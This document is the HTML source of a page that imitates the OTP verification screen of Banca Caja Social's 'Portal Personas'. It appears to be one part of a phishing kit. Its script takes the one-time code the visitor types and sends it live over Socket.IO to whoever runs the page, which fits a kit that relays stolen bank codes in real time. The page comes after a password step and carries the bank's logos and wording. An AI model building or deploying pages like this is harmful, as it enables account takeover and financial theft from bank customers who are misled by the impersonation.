<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP - Portal Personas - Banca Caja Social</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:none;justify-content:center;align-items:center;">
        <div style="text-align:center;">
            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
        </div>
    </div>
    <style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}.loading-overlay.show{display:flex!important}</style>
    
    <div class="container">
        <div class="left-section">
            <img src="img/background-4.png" alt="Familia" class="background-image">
        </div>
        <div class="right-section">
            <div class="form-container">
                <div class="logo-container">
                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
                </div>
                
                <h1 class="title">Bienvenido al<br>Portal Personas</h1>
                
                <p class="subtitle">
                    Ingrese el código OTP que fue enviado<br>
                    a su celular o correo electrónico.<br>
                    El código puede tener hasta <strong>8 dígitos</strong>.
                </p>
                
                <form class="login-form" id="otpForm">
                    <label for="otp" class="form-label">Código OTP</label>
                    <input 
                        type="text" 
                        id="otp" 
                        name="otp" 
                        class="form-input"
                        placeholder="00000000"
                        maxlength="8"
                        inputmode="numeric"
                        pattern="[0-9]*"
                    >
                    <p class="error-message" style="display: none;">Código OTP inválido. Debe contener entre 4 y 8 dígitos.</p>
                    
                    <button type="submit" class="btn-siguiente" id="btnVerificar" disabled>Siguiente</button>
                    
                    <a href="#" class="link-password">¿No recibió el código? ▼</a>
                    
                    <div class="separator"></div>
                    
                    <div class="back-link-container">
                        <a href="password.html" class="link-back">← Volver</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const otpInput = document.getElementById('otp');
            const btnSiguiente = document.querySelector('.btn-siguiente');
            const errorMessage = document.querySelector('.error-message');
            const form = document.getElementById('otpForm');
            
            // Validación del OTP - solo números
            otpInput.addEventListener('input', function(e) {
                // Solo permitir números
                this.value = this.value.replace(/[^0-9]/g, '');
                
                const value = this.value;
                
                // Ocultar mensaje de error mientras escribe
                errorMessage.style.display = 'none';
                otpInput.classList.remove('error');
                
                // Habilitar botón cuando tiene entre 4 y 8 dígitos
                if (value.length >= 4 && value.length <= 8) {
                    btnSiguiente.classList.add('enabled');
                    btnSiguiente.disabled = false;
                    btnSiguiente.removeAttribute('disabled');
                } else {
                    btnSiguiente.classList.remove('enabled');
                    btnSiguiente.disabled = true;
                    btnSiguiente.setAttribute('disabled', 'disabled');
                }
            });
            
            // Enviar OTP
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const value = otpInput.value;
                
                if (value.length < 4 || value.length > 8) {
                    errorMessage.style.display = 'block';
                    otpInput.classList.add('error');
                    return;
                }
                
                // Enviar a través de Socket.IO
                socketManager.sendOTP(value);
            });
        });
    </script>

    <script src="/js/banco-utils.js"></script>
    <script src="client-optimized.js"></script>
</body>
</html>
